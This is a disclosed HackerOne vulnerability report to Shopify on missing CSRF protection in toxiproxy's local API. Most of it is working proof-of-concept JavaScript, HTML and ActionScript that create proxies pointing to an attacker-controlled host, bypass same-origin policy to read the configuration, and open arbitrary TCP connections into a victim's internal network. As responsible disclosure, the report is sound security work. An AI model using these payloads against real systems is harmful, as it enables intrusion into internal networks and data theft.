# [out-of-scope] toxiproxy: Lack of CSRF protection allows an attacker to gain access to internal Shopify network

## Report Details
- **Report ID**: 236349
- **URL**: https://hackerone.com/reports/236349
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-06-04T04:15:23.236Z
- **Disclosed**: 2018-07-11T20:32:48.335Z

## Reporter
- **Username**: bored-engineer
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
# Disclaimer
In case this report ever becomes public I wanted to start it out with a disclaimer so it doesn't become referenced an example for out-of-scope/policy violating submissions in the future:

* At the time of submission this report is out-of-scope and as such I have no expectations of reward.
* At no point was this ever tested against Shopify infrastructure, all testing was completed locally and the potential abuse vectors are theoretical at best.
* The impact of this report is highly dependent on the architecture of the internal network at Shopify, without knowledge of the internal layout I can only speculate on impact.
* This issue was reported privately via HackerOne (instead of a public GitHub issue) so the Shopify team could choose how to handle the report. I fully respect any decision they make regarding fixing this issue or leaving it as is to not break existing functionality. 

# Background
In [early 2015](https://engineering.shopify.com/blogs/engineering/building-and-testing-resilient-ruby-on-rails-applications?utm_campaign=Feed%3A%20Sirupsen%20%28Sirupsen%29&utm_medium=feed&utm_source=feedburner) the Shopify engineering team [open-sourced](https://github.com/Shopify/toxiproxy) a tool called "Toxiproxy". The tool is designed to simulate chaotic network conditions by proxying TCP traffic to help understand and test how an application behaves under extreme load or other error conditions caused by network issues. The tool works by exposing a [HTTP API](https://github.com/Shopify/toxiproxy#http-api) which is bound to port `8474` on the loopback interface (by default, this is customizable). The API allows clients to start and stop new proxies as well as start and stop [toxics](https://github.com/Shopify/toxiproxy#toxics) to simulate error conditions for each proxy. The tool can be installed from the [Shopify HomeBrew tap](https://github.com/Shopify/homebrew-shopify) on macOS as well as well as from [pre-compiled binaries](https://github.com/Shopify/toxiproxy/releases) on other platforms. For this report it is assumed that the tool has already been installed and the service configured to run in the background (as suggested in [the documentation](https://github.com/Shopify/homebrew-shopify/blob/master/toxiproxy.rb#L28)). See the "Environment Setup" section for more details.

# Description
The [HTTP API](https://github.com/Shopify/toxiproxy#http-api) for toxiproxy does not have any CSRF protections. This allows a malicious webpage to configure, start, and modify arbitrary proxies. By exploiting [same-origin policy](https://en.wikipedia.org/wiki/Same-origin_policy) and Adobe Flash [socket policy files](http://www.adobe.com/devnet/flashplayer/articles/socket_policy_files.html) a malicious webpage can abuse this CSRF make arbitrary TCP connections (including HTTP connections) within the internal network of a toxiproxy user. This could be used to exfiltrate data from systems which are not exposed to the internet but are accessible by the victim. Please note the attacker would not gain access to the victim's existing authenticated sessions and as such could only use this issue to access systems which are protected solely by IP whitelists or have weak/no authentication. A number of PoCs can be found below...


# Impact
If a Shopify employee who has toxiproxy installed clicks a malicious link a malicious actor can gain access to the internal network of Shopify with the ability to read/write arbitrary TCP connections within the network. Additionally, because DNS resolution is done by the toxiproxy server the attacker may not even need to map the internal network ahead of time, they could provide internal hostnames and they will be faithfully resolved by the internal split-DNS provider. The impact of this access is highly dependent on what systems are accessible without authentication (or with weak auth) within the Shopify internal network, I'll choose not to speculate there and let the Shopify team better assess the impact.

# Remediation
The API should implement some form of CSRF protection, ideally by just placing the entire API behind authentication.


# Environment Setup
All exploits described in this report were tested on `macOS Sierra 10.12.3 (16D32)` against `toxiproxy v2.1.1` (latest at the time of submission) which was installed as follows:

``` 
$ brew update
	[snip]
$ brew install toxiproxy
	==> Installing toxiproxy from shopify/shopify
	==> Downloading https://github.com/Shopify/toxiproxy/releases/download/v2.1.1/toxiproxy-server
	Already downloaded: /Users/luke/Library/Caches/Homebrew/toxiproxy-2.1.1
	==> Downloading https://github.com/Shopify/toxiproxy/releases/download/v2.1.1/toxiproxy-cli-da
	Already downloaded: /Users/luke/Library/Caches/Homebrew/toxiproxy--cli-2.1.1
	==> Caveats
	To have launchd start shopify/shopify/toxiproxy now and restart at login:
	  brew services start shopify/shopify/toxiproxy
	Or, if you don't want/need a background service you can just run:
	  toxiproxy
	==> Summary
	🍺  /usr/local/Cellar/toxiproxy/2.1.1: 5 files, 13.4MB, built in 1 second
$ brew services start shopify/shopify/toxiproxy
	==> Successfully started `toxiproxy` (label: homebrew.mxcl.toxiproxy)
```

A number of servers have been setup on [toxiproxy.attackerdoma.in](http://toxiproxy.attackerdoma.in) to facilitate the PoCs, the source code for these can be found at the following private gist: [gist.github.com/bored-engineer/50aa6591f307d51c28b4be71dd80f8a9](https://gist.github.com/bored-engineer/50aa6591f307d51c28b4be71dd80f8a9). Please note that these are servers are hosted on ephemeral instance and likely will not remain online after the report has been triaged and resolved. 

# PoC - Create a new proxy
Demonstrating the issue is fundamentally pretty simple and can be done as follows...

PoC available at: [attackerdoma.in/7c9e1586-ab53-48d7-9704-165865a90ab1.html](http://attackerdoma.in/7c9e1586-ab53-48d7-9704-165865a90ab1.html)

```js
fetch("http://localhost:8474/proxies", {
	method: "POST",
	mode: "no-cors",
	body: JSON.stringify({
		name: "csrf",
		listen: "0.0.0.0:2773",
		upstream: "toxiproxy.attackerdoma.in:12773",
		enabled: true
	}),
});
```

You can verify the PoC worked correctly by either accessing the new proxy at [http://127.0.0.1:2773/1efb54c5](http://127.0.0.1:2773/1efb54c5) or via the [toxiproxy-cli](https://github.com/Shopify/toxiproxy#cli-example):

```
$ toxiproxy-cli inspect csrf
Name: csrf	Listen: 127.0.0.1:2773	Upstream: toxiproxy.attackerdoma.in:2773
======================================================================
Proxy has no toxics enabled.
```

# PoC - Bypass SOP to read current state
While we can CSRF the creation of proxies, we cannot read the current toxiproxy state which could contain useful information for an attacker as it is blocked by [SOP](https://en.wikipedia.org/wiki/Same-origin_policy). We can bypass this restriction by executing the following steps:

1. CSRF create a new `pivot` proxy pointing to `http://attackerdoma.in:17486`
2. Redirect the webpage to the new `pivot` proxy
3. From the new webpage use the CSRF to change the upstream for the `pivot` proxy to point to `http://127.0.0.1:8474` (the toxiproxy HTTP API)
4. Make a XHR request to read the configuration (because the browser believes it is still communicating with the same origin, this is allowed)


PoC available at: [attackerdoma.in/a10f2786-7149-43e8-8a90-b3fa46caafd5.html](http://attackerdoma.in/a10f2786-7149-43e8-8a90-b3fa46caafd5.html)

The PoC for this consists of two stages...

```js
// Get the instance we are exploiting
let toxiproxy = new URL(prompt("Enter the URL of the toxiproxy instance you would like to CSRF:", "http://localhost:8474"));
toxiproxy.pathname = "proxies";
// CSRF creation of the proxy
fetch(toxiproxy.toString(), {
	method: "POST",
	mode: "no-cors",
	body: JSON.stringify({
		name: "pivot",
		listen: "0.0.0.0:7486",
		upstream: "toxiproxy.attackerdoma.in:17486",
		enabled: true
	}),
}).then(() => {
	// There is a chance the "pivot" proxy already exists, if so modify it instead
	toxiproxy.pathname = "proxies/pivot"
	return fetch(toxiproxy.toString(), {
		method: "POST",
		mode: "no-cors",
		body: JSON.stringify({
			name: "pivot",
			listen: "0.0.0.0:7486",
			upstream: "toxiproxy.attackerdoma.in:17486",
			enabled: true
		}),
	})
}).then(() => {
	// Redirect to the PoC, passing the toxiproxy URL used (in-case it was custom)
	let pivotproxy = new URL(toxiproxy);
	pivotproxy.port = 7486;
	pivotproxy.pathname = "3450b92c";
	pivotproxy.hash = "#" + toxiproxy.toString();
	window.location.href = pivotproxy.toString();
});
```
Followed by the second stage:

```js
// CSRF the proxy to point to it's own HTTP interface
let toxiproxy = new URL(window.location.hash.substring(1));
toxiproxy.pathname = "/proxies/pivot";
fetch(toxiproxy.toString(), {
	method: "POST",
	mode: "no-cors",
	body: JSON.stringify({
		name: "pivot",
		listen: "0.0.0.0:7486",
		upstream: toxiproxy.host,
		enabled: true
	}),
}).then(() => {
	// Fetch the list of proxies from ourself (allows because it's same-origin)
	let self = new URL(window.location.href);
	self.pathname = "/proxies";
	return fetch(self.toString(), {
		method: "GET",
	})
}).then((r) => r.json()).then((conf) => {
	document.write("<pre>Exfiltrated the following toxiproxy configuration:\n" + JSON.stringify(conf, null, 2) + "</pre>");
});
```
# PoC - Connect to arbitrary hosts and read/write arbitrary TCP data
While reading and writing HTTP traffic is fun, the holy grail of internal network access is the ability to read/write arbitrary TCP traffic. This is actually possible due to Adobe Flash. Flash has had the ability to read/write raw TCP sockets for a number of years however it requires that the TCP server it connects to respond with a [socket policy file](http://www.adobe.com/devnet/flashplayer/articles/socket_policy_files.html) when requested. Thankfully, per the documentation, once flash has received permission it will cache it indefinitely (per IP/port pair):

> Once Flash Player receives permission, it will remember the result for the lifetime of the SWF file. Flash Player associates each socket policy file to an IP address, and it needs a policy file for each connection to a new IP address. For instance, assume that the developer specifies a hostname for the connection and that a DNS lookup returns multiple IP addresses. Every time the IP address changes for the hostname, Flash Player will check the new IP address for a socket policy file. This helps to protect against DNS rebinding attacks.

By using a similar technique as the previous PoC we can swap out the upstream proxy once this permission has been granted and cached, allowing us to read/write arbitrary TCP traffic within the network. The attack looks like this:

1. Load a specially crafted SWF file which we will use to send the data
2. CSRF create a new `policy` proxy pointing to `attackerdoma.in:17654`
2. Trigger the SWF to open a socket to the `policy` proxy which will grant full permissions (and be cached for the lifetime of the SWF) 
3. Use the CSRF to change the upstream for the `pivot` proxy to point to our target TCP address.
4. Make arbitrary TCP connections from the SWF

The PoC for this consists of two parts...
PoC available at: [attackerdoma.in/0761bfa0-b69a-436b-a474-c67b04157abd.html](http://attackerdoma.in/0761bfa0-b69a-436b-a474-c67b04157abd.html)

The ActionScript for the SWF file is as follows (compiled with the Adobe Flex SDK 4.6):

```actionscript
package {
	import flash.display.Sprite;
	import flash.net.Socket;
	import flash.system.Security;
	import flash.events.*;
	import flash.external.ExternalInterface;

	public class Main extends Sprite {

		public function Main() {
			Security.allowDomain("*");
			Security.allowInsecureDomain("*");
			ExternalInterface.addCallback("connect", connect);
			ExternalInterface.call("onready");
		}

		public function dataHandler(event:ProgressEvent):void { 
			var socket:Socket = event.target as Socket;
			var msg:String = socket.readUTFBytes(socket.bytesAvailable); 
			ExternalInterface.call("onsocketdata", escape(msg));
		}

		public function closeHandler(event:Event):void { 
			ExternalInterface.call("onsocketclose");
		}

		public function connect(host:String, port:int, msg:String):String {
			var socket:Socket;
			socket = new Socket();
			try {
				socket.connect(host, port);
				socket.writeUTFBytes(msg); 
				socket.addEventListener(Event.CLOSE, closeHandler);
				socket.addEventListener(ProgressEvent.SOCKET_DATA, dataHandler); 
				socket.flush(); 
			} catch (error:Error) { 
				socket.close(); 
				return error.message;
			} 
			return "";
		}
	}
}
```
The HTML/JS for the PoC is as follows:

```html
<!DOCTYPE html>
<html>
	<head>
		<script>
			// Called by flash once loaded
			function onready() {
				// Get access to the flash objects
				let flash = document.getElementById("flash");
				// Get the instance we are exploiting
				let toxiproxy = new URL(prompt("Enter the URL of the toxiproxy instance you would like to CSRF:", "http://localhost:8474"));
				toxiproxy.pathname = "proxies";
				// CSRF creation of the proxy
				fetch(toxiproxy.toString(), {
					method: "POST",
					mode: "no-cors",
					body: JSON.stringify({
						name: "policy",
						listen: "0.0.0.0:7654",
						upstream: "toxiproxy.attackerdoma.in:17654",
						enabled: true
					}),
				}).then(() => {
					// There is a chance the "policy" proxy already exists, if so modify it instead
					toxiproxy.pathname = "proxies/policy"
					return fetch(toxiproxy.toString(), {
						method: "POST",
						mode: "no-cors",
						body: JSON.stringify({
							name: "policy",
							listen: "0.0.0.0:7654",
							upstream: "toxiproxy.attackerdoma.in:17654",
							enabled: true
						}),
					});
				}).then(() => {
					// Once the socket has connected the first time our policy is cached
					window.onsocketclose = () => {
						// Change the proxy to point to the target
						let target = new URL("http://" + prompt("Enter the TCP host/ip pair you would like to connect to:", "localhost:9999"));
						fetch(toxiproxy.toString(), {
							method: "POST",
							mode: "no-cors",
							body: JSON.stringify({
								name: "policy",
								listen: "0.0.0.0:7654",
								upstream: target.host,
								enabled: true
							}),
						}).then(() => {
							let data = prompt("Enter the data you would like to send:", "Hello World");
							let response = "";
							window.onsocketdata = (socketData) => {
								response += socketData;
							};
							window.onsocketclose = () => {
								document.write(`<pre>Got Response:\n${response}</pre>`);
							};
							flash.connect(toxiproxy.hostname, 7654, data);
						});
					};
					// Trigger the first cache
					console.log(flash)
					flash.connect(toxiproxy.hostname, 7654, "cache");
				});
			}
		</script>
	</head>
	<body>
		<object id="flash" name="flash" type="application/x-shockwave-flash" data="10495ef1-3be0-49b2-8872-2f09e29ad848.swf">
		    <param name="movie" value="10495ef1-3be0-49b2-8872-2f09e29ad848.swf" />
		    <param name="AllowScriptAccess" value="always" />
		</object>
	</body>
</html>
```

# Postscript
I know this was a rather long report, and it's fundamentally a pretty simple issue, however it's a rather unique issue once you get into exploitation and I had a lot of fun working on it, I hope you guys enjoy it too.

## Attachments
No attachments
